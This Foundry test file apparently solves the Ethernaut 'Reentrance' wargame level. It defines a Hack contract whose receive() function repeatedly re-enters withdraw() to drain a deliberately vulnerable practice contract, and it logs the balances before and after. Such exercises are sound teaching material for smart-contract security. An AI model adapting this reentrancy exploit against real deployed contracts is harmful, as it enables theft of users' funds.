// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "forge-std/Test.sol";

import {Reentrance} from "../src/10.Reentrance.sol";

contract Hack {
  address payable reentranceAddress;
  bool isStart;
  constructor(address payable _reentranceAddress) public {
      reentranceAddress = _reentranceAddress;    
  }
  function start() external {
    isStart = true;
  }
  receive() external payable {
    if(isStart && reentranceAddress.balance >= 10){
      try Reentrance(reentranceAddress).withdraw(10) {}
      catch {}
    }
    console.log("hack balance", address(this).balance);
    console.log("reentrance balance", reentranceAddress.balance);
  }
}

contract ReentranceHackTest is Test {
  address payable reentrance;
  address payable hack;
  function setUp() public {
    reentrance = payable(address(new Reentrance()));
    reentrance.call{value:200}("");
    hack = payable(address(new Hack(reentrance)));
    Reentrance(reentrance).donate{value:100}(hack);
    console.log("init hack balance",  Reentrance(reentrance).balanceOf(hack));
    console.log("init reentrance balance",  reentrance.balance);
  }
  function testHack() public {
    Hack(hack).start();
    vm.startPrank(hack);
    Reentrance(reentrance).withdraw(1);

    console.log("finish hack balance", hack.balance);
    console.log("finish reentrance balance",  reentrance.balance);
  }
}